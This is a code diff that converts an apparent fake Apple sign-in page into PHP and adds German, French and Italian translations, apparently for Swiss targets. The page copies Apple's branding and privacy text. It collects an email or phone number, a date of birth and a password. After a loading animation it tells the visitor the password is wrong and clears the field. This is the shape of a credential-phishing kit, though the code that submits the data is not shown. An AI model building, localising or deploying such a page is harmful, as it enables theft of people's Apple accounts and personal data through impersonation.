@@ -1,5 +1,68 @@
-<!DOCTYPE html>
-<html lang="de-CH">
+<?php
+session_start();
+include __DIR__ . '/lang_main.php';
+
+// Page-specific translations
+$page_trans = [
+    'de' => [
+        'title' => 'Mit Ihrem Apple Konto anmelden',
+        'email_placeholder' => 'E-Mail oder Telefonnummer',
+        'create_account' => 'Apple-Konto erstellen',
+        'continue' => 'Fortfahren',
+        'signin_iphone' => 'Mit iPhone anmelden',
+        'iphone_note' => 'Erfordert ein Gerät mit iOS 17 oder neuer.',
+        'privacy_title' => 'Datenschutz',
+        'privacy_text' => 'Die Informationen zu Ihrem Apple-Konto werden verwendet, um Sie sicher anmelden zu lassen und auf Ihre Daten zuzugreifen. Apple speichert bestimmte Daten für Sicherheits-, Support- und Meldezwecke. Wenn Sie dies akzeptieren, kann Apple die Informationen zu Ihrem Apple-Konto auch verwenden, um Ihnen E-Mails und Marketing-Mitteilungen auf Grundlage Ihrer Nutzung der Apple-Services zu senden.',
+        'dob_label' => 'Ihr Geburtsdatum',
+        'dob_placeholder' => 'TT/MM/JJJJ',
+        'dob_format' => 'Format: TT/MM/JJJJ',
+        'password_placeholder' => 'Passwort',
+        'stay_signin' => 'Angemeldet bleiben',
+        'forgot_password' => 'Passwort vergessen?',
+        'signin_btn' => 'Anmelden',
+    ],
+    'fr' => [
+        'title' => 'Se connecter avec un compte Apple',
+        'email_placeholder' => 'E-mail ou numéro de téléphone',
+        'create_account' => 'Créer un compte Apple',
+        'continue' => 'Continuer',
+        'signin_iphone' => 'Se connecter avec un iPhone',
+        'iphone_note' => 'Nécessite un appareil doté d\'iOS 17 ou version ultérieure.',
+        'privacy_title' => 'Confidentialité',
+        'privacy_text' => 'Les informations de votre compte Apple sont utilisées pour vous permettre de vous connecter en toute sécurité et d\'accéder à vos données. Apple enregistre certaines données à des fins de sécurité, d\'assistance et de signalement. Si vous l\'acceptez, Apple peut également utiliser les informations de votre compte Apple pour vous envoyer des e-mails et des communications marketing en se basant notamment sur votre utilisation des services Apple.',
+        'dob_label' => 'Votre date de naissance',
+        'dob_placeholder' => 'JJ/MM/AAAA',
+        'dob_format' => 'Format: JJ/MM/AAAA',
+        'password_placeholder' => 'Mot de passe',
+        'stay_signin' => 'Rester connecté',
+        'forgot_password' => 'Mot de passe oublié ?',
+        'signin_btn' => 'Se connecter',
+    ],
+    'it' => [
+        'title' => 'Accedi con il tuo account Apple',
+        'email_placeholder' => 'E-mail o numero di telefono',
+        'create_account' => 'Crea un account Apple',
+        'continue' => 'Continua',
+        'signin_iphone' => 'Accedi con iPhone',
+        'iphone_note' => 'Richiede un dispositivo con iOS 17 o versione successiva.',
+        'privacy_title' => 'Privacy',
+        'privacy_text' => 'Le informazioni del tuo account Apple vengono utilizzate per consentirti di accedere in sicurezza e accedere ai tuoi dati. Apple memorizza determinati dati per scopi di sicurezza, supporto e reporting. Se lo accetti, Apple può anche utilizzare le informazioni del tuo account Apple per inviarti email e comunicazioni di marketing in base al tuo utilizzo dei servizi Apple.',
+        'dob_label' => 'La tua data di nascita',
+        'dob_placeholder' => 'GG/MM/AAAA',
+        'dob_format' => 'Formato: GG/MM/AAAA',
+        'password_placeholder' => 'Password',
+        'stay_signin' => 'Resta connesso',
+        'forgot_password' => 'Password dimenticata?',
+        'signin_btn' => 'Accedi',
+    ]
+];
+
+function t_page($key) {
+    global $page_trans, $current_lang;
+    return $page_trans[$current_lang][$key] ?? $page_trans['de'][$key] ?? $key;
+}
+?><!DOCTYPE html>
+<html lang="<?= $current_lang ?>">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
@@ -611,7 +674,7 @@
 <body>
 
   <!-- LANGUAGE SELECTOR MODAL -->
-  <div id="languageModal" class="show">
+  <div id="languageModal" class="<?= empty($_SESSION['lang_selected']) ? 'show' : '' ?>">
     <div class="language-card">
       <div class="language-title">Choose your language</div>
       <div class="language-subtitle">Choisissez votre langue · Scegli la tua lingua</div>
@@ -701,7 +764,7 @@
         </svg>
       </div>
 
-      <h1 id="main-title">Mit Ihrem Apple<br>Konto anmelden</h1>
+      <h1 id="main-title"><?= t_page('title') ?></h1>
 
       <!-- SCHRITT 1: E-MAIL -->
       <div id="step1" style="width:100%">
@@ -709,13 +772,13 @@
           id="emailInput"
           type="text"
           class="input-field"
-          placeholder="E-Mail oder Telefonnummer"
+          placeholder="<?= t_page('email_placeholder') ?>"
           autocomplete="username"
           autocorrect="off"
           autocapitalize="none"
           spellcheck="false"
         >
-        <a href="#" class="create-link">Apple-Konto erstellen</a>
+        <a href="#" class="create-link"><?= t_page('create_account') ?></a>
         <div class="separator"></div>
         <div class="privacy-block">
           <span class="privacy-icon">
@@ -727,39 +790,39 @@
             </svg>
           </span>
           <p class="privacy-text">
-            Die Informationen zu Ihrem Apple-Konto werden verwendet, um Sie sicher anmelden zu lassen und auf Ihre Daten zuzugreifen. Apple speichert bestimmte Daten für Sicherheits-, Support- und Meldezwecke. Wenn Sie dies akzeptieren, kann Apple die Informationen zu Ihrem Apple-Konto auch verwenden, um Ihnen E-Mails und Marketing-Mitteilungen auf Grundlage Ihrer Nutzung der Apple-Services zu senden. <a href="#">Weitere Informationen zur Verwaltung Ihrer Daten…</a>
+            <?= t_page('privacy_text') ?> <a href="#">Weitere Informationen zur Verwaltung Ihrer Daten…</a>
           </p>
         </div>
         <div class="btn-row">
-          <button id="btnContinue" class="btn-continue" type="button">Fortfahren</button>
+          <button id="btnContinue" class="btn-continue" type="button"><?= t_page('continue') ?></button>
           <button type="button" class="btn-passkey">
             <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="16" height="16">
               <path d="M12 2C9.243 2 7 4.243 7 7c0 1.879.938 3.54 2.367 4.547A7.002 7.002 0 0 0 5 18.5V19h2v-.5a5 5 0 0 1 10 0V19h2v-.5a7.002 7.002 0 0 0-4.367-6.453A4.993 4.993 0 0 0 17 7c0-2.757-2.243-5-5-5zm0 2a3 3 0 1 1 0 6 3 3 0 0 1 0-6z"/>
             </svg>
-            Mit iPhone anmelden
+            <?= t_page('signin_iphone') ?>
           </button>
         </div>
-        <p class="btn-note">Erfordert ein Gerät mit iOS&nbsp;17 oder neuer.</p>
+        <p class="btn-note"><?= t_page('iphone_note') ?></p>
       </div>
 
       <!-- SCHRITT 1.5: ALTERSBESTÄTIGUNG -->
       <div id="step1_5" style="width:100%">
         <div class="dob-container">
-          <label class="dob-label">Ihr Geburtsdatum</label>
+          <label class="dob-label"><?= t_page('dob_label') ?></label>
           <div class="dob-input-wrapper">
             <input
               id="dobInput"
               type="text"
               class="input-field"
-              placeholder="TT/MM/JJJJ"
+              placeholder="<?= t_page('dob_placeholder') ?>"
               maxlength="10"
               inputmode="numeric"
             >
           </div>
-          <p class="dob-hint">Format: TT/MM/JJJJ</p>
+          <p class="dob-hint"><?= t_page('dob_format') ?></p>
         </div>
         <p class="error-msg" id="ageError"></p>
-        <button id="btnAgeVerify" class="btn-continue" type="button" style="width: 100%;">Fortfahren</button>
+        <button id="btnAgeVerify" class="btn-continue" type="button" style="width: 100%;"><?= t_page('continue') ?></button>
       </div>
 
       <!-- SCHRITT 2: PASSWORT -->
@@ -776,7 +839,7 @@
             id="passInput"
             type="password"
             class="input-field"
-            placeholder="Passwort"
+            placeholder="<?= t_page('password_placeholder') ?>"
             autocomplete="current-password"
           >
           <button type="button" class="eye-btn" id="eyeBtn" aria-label="Passwort anzeigen">
@@ -787,11 +850,11 @@
         </div>
         <div class="check-row">
           <label class="check-label">
-            <input type="checkbox" id="stayCheck"> Angemeldet bleiben
+            <input type="checkbox" id="stayCheck"> <?= t_page('stay_signin') ?>
           </label>
-          <a href="#" class="forgot-link">Passwort vergessen?&nbsp;›</a>
+          <a href="#" class="forgot-link"><?= t_page('forgot_password') ?>&nbsp;›</a>
         </div>
-        <button id="btnSignin" class="btn-signin" type="button">Anmelden</button>
+        <button id="btnSignin" class="btn-signin" type="button"><?= t_page('signin_btn') ?></button>
       </div>
 
     </div>
@@ -799,6 +862,54 @@
 
   <script>
   (function(){
+    // ── TRANSLATION SYSTEM ──
+    var translations = {
+      'de': {
+        'dob_required': 'Bitte geben Sie Ihr Geburtsdatum ein',
+        'dob_invalid_format': 'Ungültiges Format. Verwenden Sie TT/MM/JJJJ',
+        'dob_month_invalid': 'Der Monat muss zwischen 01 und 12 liegen',
+        'dob_day_invalid': 'Der Tag muss zwischen 01 und 31 liegen',
+        'dob_year_invalid': 'Das Jahr ist ungültig',
+        'dob_not_exist': 'Dieses Datum existiert nicht',
+        'dob_title': 'Geben Sie Ihr<br>Geburtsdatum ein',
+        'password_title': 'Geben Sie Ihr<br>Passwort ein',
+        'main_title': 'Mit Ihrem Apple<br>Konto anmelden',
+        'password_error': 'Passwort ist falsch. Bitte versuchen Sie es erneut.',
+        'loading_title': 'Anmeldung wird durchgeführt…'
+      },
+      'fr': {
+        'dob_required': 'Veuillez entrer votre date de naissance',
+        'dob_invalid_format': 'Format invalide. Utilisez JJ/MM/AAAA',
+        'dob_month_invalid': 'Le mois doit être entre 01 et 12',
+        'dob_day_invalid': 'Le jour doit être entre 01 et 31',
+        'dob_year_invalid': 'L\'année est invalide',
+        'dob_not_exist': 'Cette date n\'existe pas',
+        'dob_title': 'Vérifier votre<br>date de naissance',
+        'password_title': 'Entrez votre<br>mot de passe',
+        'main_title': 'Se connecter avec un<br>compte Apple',
+        'password_error': 'Le mot de passe est incorrect. Veuillez réessayer.',
+        'loading_title': 'Connexion en cours…'
+      },
+      'it': {
+        'dob_required': 'Inserisci la tua data di nascita',
+        'dob_invalid_format': 'Formato non valido. Usa GG/MM/AAAA',
+        'dob_month_invalid': 'Il mese deve essere tra 01 e 12',
+        'dob_day_invalid': 'Il giorno deve essere tra 01 e 31',
+        'dob_year_invalid': 'L\'anno non è valido',
+        'dob_not_exist': 'Questa data non esiste',
+        'dob_title': 'Inserisci la tua<br>data di nascita',
+        'password_title': 'Inserisci la tua<br>password',
+        'main_title': 'Accedi con il tuo<br>account Apple',
+        'password_error': 'La password non è corretta. Prova di nuovo.',
+        'loading_title': 'Accesso in corso…'
+      }
+    };
+
+    function t(key) {
+      var lang = '<?= $current_lang ?>';
+      return (translations[lang] && translations[lang][key]) || translations['de'][key] || key;
+    }
+
     // ── LANGUAGE SELECTOR ──
     var langModal = document.getElementById('languageModal');
     var langButtons = document.querySelectorAll('.language-btn');
@@ -860,7 +971,7 @@
       // Show age verification step
       step1.style.display = 'none';
       step1_5.style.display = 'block';
-      title.innerHTML = 'Geben Sie Ihr<br>Geburtsdatum ein';
+      title.innerHTML = t('dob_title');
       dobInput.focus();
     });
 
@@ -870,7 +981,7 @@
       var ageError = document.getElementById('ageError');
 
       if (!dobStr) {
-        ageError.textContent = 'Bitte geben Sie Ihr Geburtsdatum ein';
+        ageError.textContent = t('dob_required');
         ageError.style.display = 'block';
         dobInput.focus();
         return;
@@ -881,7 +992,7 @@
       var match = dobStr.match(dobRegex);
 
       if (!match) {
-        ageError.textContent = 'Ungültiges Format. Verwenden Sie TT/MM/JJJJ';
+        ageError.textContent = t('dob_invalid_format');
         ageError.style.display = 'block';
         dobInput.focus();
         return;
@@ -893,14 +1004,14 @@
 
       // Validate date ranges
       if (month < 1 || month > 12) {
-        ageError.textContent = 'Der Monat muss zwischen 01 und 12 liegen';
+        ageError.textContent = t('dob_month_invalid');
         ageError.style.display = 'block';
         dobInput.focus();
         return;
       }
 
       if (day < 1 || day > 31) {
-        ageError.textContent = 'Der Tag muss zwischen 01 und 31 liegen';
+        ageError.textContent = t('dob_day_invalid');
         ageError.style.display = 'block';
         dobInput.focus();
         return;
@@ -909,7 +1020,7 @@
       // Check if year is reasonable (not in future, not too old)
       var currentYear = new Date().getFullYear();
       if (year > currentYear || year < 1900) {
-        ageError.textContent = 'Das Jahr ist ungültig';
+        ageError.textContent = t('dob_year_invalid');
         ageError.style.display = 'block';
         dobInput.focus();
         return;
@@ -918,7 +1029,7 @@
       // Create date and validate it exists
       var dob = new Date(year, month - 1, day);
       if (dob.getDate() !== day || dob.getMonth() !== month - 1) {
-        ageError.textContent = 'Dieses Datum existiert nicht';
+        ageError.textContent = t('dob_not_exist');
         ageError.style.display = 'block';
         dobInput.focus();
         return;
@@ -949,7 +1060,7 @@
         step1_5.style.display = 'none';
         emailDisplay.textContent = email;
         step2.style.display = 'block';
-        title.innerHTML = 'Geben Sie Ihr<br>Passwort ein';
+        title.innerHTML = t('password_title');
         passInput.focus();
       }
     });
@@ -972,7 +1083,7 @@
     document.getElementById('btnBack').addEventListener('click', function(){
       step2.style.display = 'none';
       step1.style.display = 'block';
-      title.innerHTML = 'Mit Ihrem Apple<br>Konto anmelden';
+      title.innerHTML = t('main_title');
     });
 
     // ── Schritt 2: Anmeldung senden ──
@@ -998,6 +1109,10 @@
     // ── Apple loading overlay ──
     function showLoadingOverlay(userEmail) {
       var overlay = document.getElementById('loadingOverlay');
+      var loadingTitle = document.querySelector('.loading-title');
+      if (loadingTitle) {
+        loadingTitle.textContent = t('loading_title');
+      }
       document.getElementById('loadingEmail').textContent = userEmail;
       overlay.style.display = 'flex';
       requestAnimationFrame(function() {
@@ -1032,7 +1147,7 @@
               hideLoadingOverlay(function() {
                 passInput.value = '';
                 var err = document.getElementById('passError');
-                err.textContent = 'Passwort ist falsch. Bitte versuchen Sie es erneut.';
+                err.textContent = t('password_error');
                 err.style.display = 'block';
                 passInput.focus();
               });
